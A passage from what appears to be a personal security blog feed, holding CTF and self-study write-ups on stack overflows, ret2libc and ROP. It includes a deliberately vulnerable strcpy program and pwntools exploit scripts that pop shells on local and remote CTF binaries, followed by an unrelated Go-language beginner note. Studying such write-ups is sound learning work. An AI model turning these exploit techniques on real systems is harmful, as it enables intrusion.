main, libc_start_main_got])<br>sh.sendlineafter(<span class="hljs-string">&#x27;Can you find it !?&#x27;</span>, payload)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;get the related addr&quot;</span><br>libc_start_main_addr = u32(sh.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>libc = LibcSearcher(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr)<br>libcbase = libc_start_main_addr - libc.dump(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>)<br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;get shell&quot;</span><br>payload = flat([<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">104</span>, system_addr, <span class="hljs-number">0xdeadbeef</span>, binsh_addr])<br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/26/%E5%9F%BA%E6%9C%ACROP/51.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学习CTF wiki上的基本rop技术，很多文字性的描述就直接用了上面的描述，原理性的东西基本都理解了，利用方式也都理解，后续还需要多多练习一下。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;还是继续学习练习ROP技术，现在是跟着CTF WIKI中的ROP来学习一下。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ctf-wik</summary>
      
    
    
    
    <category term="PWN" scheme="https://b1ackie.cn/categories/PWN/"/>
    
    
    <category term="ROP" scheme="https://b1ackie.cn/tags/ROP/"/>
    
  </entry>
  
  <entry>
    <title>ROP学习</title>
    <link href="https://b1ackie.cn/2021/11/17/ROP%E5%AD%A6%E4%B9%A0/"/>
    <id>https://b1ackie.cn/2021/11/17/ROP%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-11-17T07:18:13.000Z</published>
    <updated>2021-12-01T12:12:10.528Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇来学习一下ROP技术。对于栈溢出来说，可以构造足够长的数据来进行溢出，同时也可以在栈上存放可执行代码，在这里<a href="https://b1ackie.cn/2021/10/20/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/">栈溢出原理与实践</a>有介绍关于在栈上执行代码。如果在栈上不可以执行代码，就需要通过ROP跳转到libc获得shell。本篇主要是学习网上的资源，<a href="https://bbs.pediy.com/thread-263734.htm#msg_header_h1_0">从0开始CTF-PWN（四）ROP绕过栈可执行保护与GOT表劫持</a></p><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>代码</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">128</span>];<br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">strcpy</span>(buf, argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input:%s\n&quot;</span>, buf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用如下命令进行编译</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">gcc</span>-<span class="hljs-number">4</span>.<span class="hljs-number">8</span> -m<span class="hljs-number">32</span> -O<span class="hljs-number">0</span> -fno-stack-protector -o ROP ROP.c<br></code></pre></div></td></tr></table></figure><h3 id="编译参数说明"><a href="#编译参数说明" class="headerlink" title="编译参数说明"></a>编译参数说明</h3><ul><li>-m32：使用32位编译</li><li>-O0：关闭所有的优化</li><li>-g：在可执行文件中加入源码的信息</li><li>-fno-stack-protector：关闭栈保护</li><li>-z execstack：栈上代码可执行</li><li>-z norelro / -z relro -z lazy / -z relro -z now (关闭disabled / 部分开启Partial / 完全开启Full)</li></ul><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>使用IDA打开程序来看下，可以看到存在栈溢出，可以覆盖返回地址。</p><p><img src="/2021/11/17/ROP%E5%AD%A6%E4%B9%A0/1.png"></p><p>现在我们需要getshell，所以要执行<code>system(/bin/sh)</code>，现在我们需要构造一个payload，覆盖栈之后刚好覆盖返回地址。但是在实际操作中，我发现我没办法像帖子一样实现，我找不到/bin/sh的地址，所以我自己减了难度，我在源码中定义了，system和/bin/sh。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">char</span> *sz = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">a</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    system();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>现在就可以开始实现，先搜索system地址</p><p><img src="/2021/11/17/ROP%E5%AD%A6%E4%B9%A0/2.png"></p><p>查找/bin/sh地址</p><p><img src="/2021/11/17/ROP%E5%AD%A6%E4%B9%A0/3.png"></p><p>开始构造payload，先输入140个a，看一下栈的空间，刚好到返回值地址。</p><p><img src="/2021/11/17/ROP%E5%AD%A6%E4%B9%A0/4.png"></p><p>现在再来复习一下关于调用函数的时候栈的空间，调用函数的时候，栈的情况，首先是返回地址，然后是参数，依次参数n、参数n-1、参数n-2……参数1。</p><p>如图，此时只有一个参数</p><p><img src="https://b1ackie.cn/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/23.png"></p><p>所以现在payload是：140个字符（用来填充栈空间）+ system地址（覆盖返回值地址）+ 任意四个字节字符（system函数的返回地址）+ /bin/sh地址（system的参数）</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>构造的exp</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sysaddr = <span class="hljs-number">0x8048340</span><br>binaddr = <span class="hljs-number">0x8048570</span><br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">140</span> + p32(sysaddr) + <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">4</span> + p32(binaddr)<br><br>p = process(argv=[ <span class="hljs-string">&quot;/home/pwn/rop/1&quot;</span> , payload ] )<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><p>成功拿到shell</p><p><img src="/2021/11/17/ROP%E5%AD%A6%E4%B9%A0/5.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇来学习一下ROP技术。对于栈溢出来说，可以构造足够长的数据来进行溢出，同时也可以在栈上存放可执行代码，在这里&lt;a href=&quot;https</summary>
      
    
    
    
    <category term="PWN" scheme="https://b1ackie.cn/categories/PWN/"/>
    
    
    <category term="ROP" scheme="https://b1ackie.cn/tags/ROP/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界PWN-新手练习区</title>
    <link href="https://b1ackie.cn/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <id>https://b1ackie.cn/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</id>
    <published>2021-11-15T02:45:51.000Z</published>
    <updated>2021-11-26T05:48:28.744Z</updated>
    
    <content type="html"><![CDATA[<h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><p>查看文件，看到是64位文件，通过<code>checksec</code>可以查看保护的机制。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/1.png"></p><h3 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h3><p>保护机制这稍微介绍下</p><h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><p>主要是用来保护重定位段对应数据区域，默认可写</p><p>Partial RELRO表示got表不可写，got.plt可写</p><p>Full RELRO表示got表，got.plt不可写</p><h4 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h4><p>这主要是栈保护，canary意思是金丝雀，是栈保护，方式是在靠近栈底某个位置设置初值，防止栈溢出的一种保护。</p><h4 id="NX"><a href="#NX" class="headerlink" title="NX"></a>NX</h4><p>数据执行保护，在windows上是DEP技术，基本原理是将数据所在的内存页表示为不可执行。</p><h4 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h4><p>PIE保护就是基址随机化，每次加载时都会改变加载的基地址。</p><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用IDA打开，可以看到程序的流程，运行输出一串字符串之后就会调用<code>system(&quot;/bin/sh&quot;)</code>，会获得shell，不需要任何操作，只需要连接到远程主机就行了。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/2.png"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-string">&quot;59759&quot;</span>)<br>r.interactive()            <br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/3.png"></p><p>也可以直接nc到远程主机执行命令</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/4.png"></p><blockquote><p>cyberpeace{73b5fb2b3e5ef899ac9fe442ba8a3db6}</p></blockquote><h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>查看文件，可以看到是64位文件，只开启了NX保护，其他没有开启。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/5.png"></p><h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用IDA打开分析，主要是要执行<code>sub_400686</code>函数，里面会查看flag，而进入此函数的要求就是<code>dword_60106C == 0x6E756161</code>，再看前面的<code>read</code>函数，读取了十个字节的数据，读取到<code>unk_601068</code>，而<code>dword_60106C</code>离它就差4个字节，也就是read读取的数据可以溢出到<code>dword_60106C</code>。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/6.png"></p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/7.png"></p><p>使用GDB调试看看</p><p>在<code>main</code>函数下断，调试到read处，然后输入<code>12345678</code>，再查看内存地址处的值来看下。看到<code>0x601068</code>处存放的是1234（ascii码，小端序），再看<code>0x60106c</code>处看到是5678，也就是输入的八个字符后四位成功溢出到了目标地址，现在只要这里等于0x6E756161就可以了。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/8.png"></p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/9.png"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">r</span> = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-string">&quot;63359&quot;</span>)<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">4</span> + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>x<span class="hljs-number">6</span>E<span class="hljs-number">756161</span>)<br><span class="hljs-attribute">r</span>.recvuntil(<span class="hljs-string">&quot;lets get helloworld for bof\n&quot;</span>)<br><span class="hljs-attribute">r</span>.sendline(payload)<br><span class="hljs-attribute">print</span>(r.recv())<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/10.png"></p><h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>64位的文件，只开启了NX。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/11.png"></p><h3 id="详细分析-2"><a href="#详细分析-2" class="headerlink" title="详细分析"></a>详细分析</h3><p>使用IDA打开看main函数，看到<code>vulnerable_function</code>函数。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/12.png"></p><p>进入函数查看可以看到存在一个栈溢出，buf长度为128，read函数读取0x200。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/13.png"></p><p>现在找一下返回值覆盖的地方应该是什么，在函数中看到存在一个<code>callsystem</code>函数，查看可以看到可以获取shell，覆盖的返回地址为<code>callsystem</code>地址即可</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/14.png"></p><p>使用GDB调试一下，看看具体的栈空间变化，首先我们要清楚，在栈里，以这个为例子，栈底之前是缓冲区，栈底（RBP）是一个，栈底（RBP+8)再下面一个才是返回值地址，所以要覆盖返回地址的话，需要构造一共144个字符。</p><p>输入128个“a”，再输入一个“12345678”，再输入8个”c“，来查看下空间，看到当前RBP已经被12345678覆盖了，再往后一个地址是8个c。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/15.png"></p><p>执行到ret看下，看到返回地址是cccccccc</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/16.png"></p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">r</span> = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-string">&quot;59478&quot;</span>)<br><span class="hljs-attribute">addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">400596</span><br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0</span>x<span class="hljs-number">88</span> + p<span class="hljs-number">64</span>(addr)<br><span class="hljs-attribute">r</span>.recvuntil(<span class="hljs-string">&quot;Hello, World\n&quot;</span>)<br><span class="hljs-attribute">r</span>.send(payload)<br><span class="hljs-attribute">r</span>.interactive()<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/17.png"></p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>32位的文件，保护只开启了NX</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/18.png"></p><p>根据题目的提示，简单的ROP，就是需要用到ROP技术，ROP就是Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过一些防御措施（比如内存不可执行）。我们可以使用libc库的函数，<code>system</code>，将函数返回地址指向<code>system</code>的地址。构造这样的</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">(<span class="hljs-string">&quot;/bin/sh&quot;</span>)</span></span>；<br></code></pre></div></td></tr></table></figure><h3 id="详细分析-3"><a href="#详细分析-3" class="headerlink" title="详细分析"></a>详细分析</h3><p>主函数的流程很简单，看下<code>vulnerable_function</code>函数</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/19.png"></p><p>看到有<code>read</code>函数，可以读取0x100字节的数据，存在栈溢出，现在只需要覆盖返回地址覆盖到<code>system</code>函数地址，还需要构造”/bin/sh”</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/20.png"></p><p>在程序中已经存在了我们需要的两个东西。</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/21.png"></p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/22.png"></p><p>现在再来复习一下关于调用函数的时候栈的空间，调用函数的时候，栈的情况，首先是返回地址，然后是参数，依次参数n、参数n-1、参数n-2……参数1。</p><p>如图，此时只有一个参数</p><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/23.png"></p><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">r</span> = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-string">&quot;50332&quot;</span>)<br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">140</span>#覆盖buf加ebp<br><span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">8048320</span>)#覆盖返回地址<br><span class="hljs-attribute">payload</span> += <span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">4</span>#system的返回地址<br><span class="hljs-attribute">payload</span> += p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>x<span class="hljs-number">804</span>A<span class="hljs-number">024</span>)#/bin/sh的地址<br><span class="hljs-attribute">r</span>.sendline(payload)<br><span class="hljs-attribute">r</span>.interactive()<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/15/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/24.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;get-shell&quot;&gt;&lt;a href=&quot;#get-shell&quot; class=&quot;headerlink&quot; title=&quot;get_shell&quot;&gt;&lt;/a&gt;get_shell&lt;/h2&gt;&lt;p&gt;查看文件，看到是64位文件，通过&lt;code&gt;checksec&lt;/code&gt;可以查看保</summary>
      
    
    
    
    <category term="攻防世界writeup" scheme="https://b1ackie.cn/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwriteup/"/>
    
    
    <category term="PWN" scheme="https://b1ackie.cn/tags/PWN/"/>
    
    <category term="CTF" scheme="https://b1ackie.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Go语言学习笔记一</title>
    <link href="https://b1ackie.cn/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://b1ackie.cn/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/</id>
    <published>2021-11-08T08:29:05.000Z</published>
    <updated>2021-11-10T11:19:44.992Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Go语言的结构"><a href="#Go语言的结构" class="headerlink" title="Go语言的结构"></a>Go语言的结构</h2><p>Go语言的基础组成有以下几部分</p><ul><li>包声明</li><li>引入包</li><li>函数</li><li>变量</li><li>语句&amp;表达式</li><li>注释</li></ul><p>写一个简单的代码，来看下大致的组成</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-comment">//定义了包名，每个程序都包含一个名为main的包</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-comment">//告诉GO编译器，这个程序使用了fmt的包</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<span class="hljs-comment">//程序开始执行的函数</span><br>fmt.Printf(<span class="hljs-string">&quot;hello world !!!&quot;</span>)<br>    <span class="hljs-comment">//将字符串输出到控制台</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="执行Go程序"><a href="#执行Go程序" class="headerlink" title="执行Go程序"></a>执行Go程序</h2><p>打开编辑器，将上述代码写进去，保存为<code>.go</code>结尾的文件。</p><p>然后使用命令行，输入命令</p><blockquote><p>go run hello.go    </p></blockquote><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/1.png"></p><p>也可以将其编译成为可执行文件，使用命令</p><blockquote><p>go build hello.go</p></blockquote><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/2.png"></p><h2 id="Go基础语法"><a href="#Go基础语法" class="headerlink" title="Go基础语法"></a>Go基础语法</h2><h3 id="Go标记"><a href="#Go标记" class="headerlink" title="Go标记"></a>Go标记</h3><p>Go程序可以由多个标记组成，可以是关键字、标识符、常量、字符串、符号。</p><h3 id="行分隔符"><a href="#行分隔符" class="headerlink" title="行分隔符"></a>行分隔符</h3><p>在Go程序中，一行代表一个语句结束。每个语句不用像C那样以分号结尾，但是如果要将多个语句写在同一行，则必须使用分号，实际开发中，并不建议使用这种方法。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino">fmt.<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hello world\n&quot;</span>)<br>fmt.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;i am b1ackie&quot;</span>)<br></code></pre></div></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>注释是不会被编译的，可以使用单行注释和多行注释</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-comment">//这是单行注释</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">多行注释</span><br><span class="hljs-comment">*/</span><br></code></pre></div></td></tr></table></figure><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p>标识符用来命名变量、类型等程序实体。一个标识符可以是一个或多个字母，数字，下划线组成的序列，但是第一个字符必须是字母或者下划线而不可以是数字。</p><p>以下这些是有效的标识符：</p><blockquote><p>bLackie    B1_ackie    _b1ackie</p></blockquote><p>这些是无效的标识符：</p><ul><li>1b1ackie（以数字开头）</li><li>case（GO语言的关键字）</li><li>a+b（运算符不允许）</li></ul><h3 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h3><p>Go语言的字符串可以通过<code>+</code>来实现</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;hello&quot;</span> + <span class="hljs-string">&quot;golang&quot;</span>)<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="/2021/11/08/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/3.png"></p><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><p>声明变量必须使用空格隔开</p><blockquote><p>var age int </p></blockquote><p>在变量与运算之间也加入空格，使得程序看起来更加的美观</p><blockquote><p>x = a + b</p></blockquote><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" 